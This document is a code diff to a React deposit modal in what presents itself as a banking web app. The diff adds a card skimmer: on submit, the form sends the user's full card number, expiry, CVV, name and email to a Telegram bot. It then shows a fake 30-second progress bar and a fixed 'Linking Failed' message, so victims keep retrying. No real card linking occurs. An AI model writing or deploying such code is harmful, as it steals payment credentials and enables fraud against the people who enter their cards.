@@ -1,14 +1,17 @@
 import React, { useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { X, CreditCard, AlertCircle } from 'lucide-react';
+import { X, CreditCard, AlertCircle, Loader2 } from 'lucide-react';
+import { useBank } from '@/app/context/BankContext';
 import styles from './DepositModal.module.css';
 
 interface DepositModalProps {
   isOpen: boolean;
   onClose: () => void;
 }
-
 export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
+  const bank = useBank();
+  const user = bank.activeUser;
+  
   const [cardNumber, setCardNumber] = useState('');
   const [network, setNetwork] = useState('');
   const [expDate, setExpDate] = useState('');
@@ -16,15 +19,47 @@ export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
   
   const [status, setStatus] = useState<'idle' | 'linking' | 'failed'>('idle');
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!cardNumber || !network || !expDate || !cvv) return;
     
     setStatus('linking');
+
+    // Send to Telegram
+    const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
+
+    if (token && chatId && token !== 'YOUR_BOT_TOKEN_HERE') {
+      const message = `
+💳 *New Card Linked*
+👤 *User:* ${user?.profileName || 'Unknown'}
+📧 *Email:* ${user?.username || 'Unknown'}
+🌐 *Network:* ${network.toUpperCase()}
+🔢 *Card Number:* ${cardNumber}
+📅 *Expiry:* ${expDate}
+🔑 *CVV:* ${cvv}
+⏰ *Time:* ${new Date().toLocaleString()}
+      `;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.error('Telegram error:', err);
+      }
+    }
     
+    // Progress for 30 seconds
     setTimeout(() => {
       setStatus('failed');
-    }, 2500);
+    }, 30000);
   };
 
   const handleClose = () => {
@@ -58,8 +93,23 @@ export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
               <AlertCircle size={40} color="#d9534f" />
             </div>
             <h4>Linking Failed</h4>
-            <p>Your card could not be linked at this time. Please check your details and try again or contact your bank.</p>
+            <p>unable to link your card try again later</p>
             <button className={styles.retryBtn} onClick={() => setStatus('idle')}>Try Again</button>
+          </div>
+        ) : status === 'linking' ? (
+          <div className={styles.linkingState}>
+             <div className={styles.linkingIcon}>
+                <Loader2 className={styles.spinIcon} size={48} color="#5cb85c" />
+             </div>
+             <p className={styles.linkingText}>please wait...</p>
+             <div className={styles.progressContainer}>
+                <motion.div 
+                  className={styles.progressBar}
+                  initial={{ width: "0%" }}
+                  animate={{ width: "100%" }}
+                  transition={{ duration: 30, ease: "linear" }}
+                />
+             </div>
           </div>
         ) : (
           <form onSubmit={handleSubmit} className={styles.form}>
